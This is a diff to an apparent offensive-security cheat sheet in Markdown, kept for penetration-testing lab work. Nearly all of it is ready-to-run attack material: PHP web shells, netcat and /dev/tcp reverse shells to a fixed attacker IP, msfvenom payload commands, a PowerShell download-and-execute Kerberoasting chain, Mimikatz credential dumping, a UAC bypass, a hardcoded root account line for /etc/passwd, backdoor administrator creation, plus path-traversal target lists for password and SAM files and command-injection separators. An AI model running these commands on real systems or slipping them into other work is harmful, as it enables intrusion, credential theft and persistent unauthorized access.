@@ -6,6 +6,15 @@
 #!/usr/bin/python
 ```
 
+## Powershell exe path
+```
+32 bit:
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
+64 bit:
+%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+```
+
 ## Python tty spawn
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -23,11 +32,69 @@ python3 -m http.server 80
 php -S 0.0.0.0:80
 ```
 
+## Directory/Path Traversal
+Linux
+```
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group 
+/etc/resolv.conf
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache/error.log
+/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/proc/self/environ
+/proc/version
+```
+Windows
+```
+C:\WINDOWS\System32\drivers\etc\hosts
+C:\Users\Administrator\NTUser.dat
+C:\Documents and Settings\Administrator\NTUser.dat
+C:\inetpub\wwwroot\global.asa
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\passwords.txt
+C:\xampp\readme-en.txt
+C:\apache\logs\access.log
+C:\apache\logs\error.log
+C:\Program Files\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\Apache Group\Apache\logs\error.log
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\DATA\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
+C:\Windows\system32\config\regback\sam
+C:\Windows\system32\config\regback\security
+C:\Windows\system32\config\regback\system
+C:\Windows\repair\sam
+C:\Windows\repair\system
+```
+
 ## PHP cmd injection
 ```
 <?php system("whoami"); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
+```
+
+## Ping/OS injection
+```
+|
+;
+%0A
+Newline (0x0a or \n)
+&
+&&
+||
+`command`
+$(command)
 ```
 
 ## XSS 
@@ -104,10 +171,10 @@ tom' or 1=1 #
 
 ## Curl request
 ```
-#GET:
+# GET:
 curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'
 
-#POST:
+# POST:
 curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
 curl -s --data "<?php shell_exec('nc -e /bin/sh 192.168.119.243 443') ?>" 'http://10.11.1.1/internal/advanced_comment_system/admin.php?ACS_path=php://input'
 ```
@@ -233,13 +300,13 @@ Z:\nc64.exe -nv 192.168.119.243 443 -e cmd.exe
 ### Files
 Msfvenom
 ```
-#Stageless
+# Stageless
 32bit:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
 msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe
 
-#Staged
+# Staged
 32bit:
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
@@ -283,10 +350,11 @@ shutdown /r /t 0
 ```
 AD
 ```
-#Direct execution
+# Direct execution
 powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
+powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.227:5556/Invoke-Kerberoast.ps1");Invoke-Kerberoast"
 
-#Import modules Powerview
+# Import modules Powerview
 $env:PSModulePath -split ';'                  (modules path)
 Enter PS,
 Import-Module Recon
@@ -298,8 +366,12 @@ Get-DomainGroup -properties name
 Get-DomainGroup -Identity 'Domain Admins'
 Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName
 Get-NetUser -SPN
+Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+cat hash.txt | tr -d '\n' | tr -d '\n' | tr -d ' ' | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' > newhash.txt
+Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerbhash.txt
+hashcat -m 13100
 
-#Mimikatz
+# Mimikatz
 privilege::debug
 token::elevate
 sekurlsa::logonpasswords
@@ -370,17 +442,17 @@ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.6 gcc -o lol lo
 ## Privilege escalation
 Linux
 ```
-#GTFOBins
+# GTFOBins
 mysql -u root -p -e '\! /bin/sh'
 
-#Root user to add in /etc/passwd
+# Root user to add in /etc/passwd
 root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash        (root2:mrcake)
 
-#Dirtycow2
+# Dirtycow2
 https://www.exploit-db.com/exploits/40839
 gcc 40839.c -o 40839 -lcrypt -pthread
 
-#Mysql UDF2 PE
+# Mysql UDF2 PE
 gcc -g -c raptor_udf2.c
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 mysql -u root -p
@@ -395,34 +467,34 @@ select do_system('bash -c "bash -i >& /dev/tcp/192.168.119.243/443 0>&1"');
 ```
 Windows
 ```
-#High mandatory level to SYSTEM
+# High mandatory level to SYSTEM
 PsExec64.exe -accepteula -i -s %SystemRoot%\system32\cmd.exe
 PsExec64.exe -i -accepteula -d -s C:\Users\nicky\AppData\Local\Temp\reverseshell64.exe
 
-#SeImpersonatePrivilege
+# SeImpersonatePrivilege
 PrintSpoofer64.exe -i -c cmd.exe
 JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
 JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
 
-#BypassUAC
+# BypassUAC
 https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\AppData\Local\Temp\reverseshell64.exe" /f
 powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
 
-#Service unquoted path 
+# Service unquoted path 
 sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168.119.243 443 -e cmd.exe"
 sc qc usosvc
 shutdown /r /t 0
 
-#Windows XP SP1 upnphost service
+# Windows XP SP1 upnphost service
 https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
 
-#Add new user
+# Add new user
 net user Bill Passw0rd /add
 net localgroup administrators Bill /add
 net localgroup "Remote Desktop Users" Bill /add
 
-#Print proof
+# Print proof
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 ```
 
